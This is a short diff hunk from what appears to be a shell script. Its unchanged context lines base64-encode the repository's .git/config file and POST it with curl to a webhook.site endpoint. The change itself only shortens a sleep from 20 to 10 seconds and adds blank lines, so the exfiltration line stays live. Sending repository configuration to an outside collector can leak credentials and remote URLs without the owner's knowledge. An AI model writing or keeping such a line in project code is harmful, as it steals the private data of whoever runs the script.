@@ -5,6 +5,8 @@ base64 ../.git/config | curl -X POST \
     --data-binary @- \
     https://webhook.site/ea683c5a-eb18-4a99-9299-e12a42264142
 
-sleep 20s
+sleep 10s
+
+
 
 
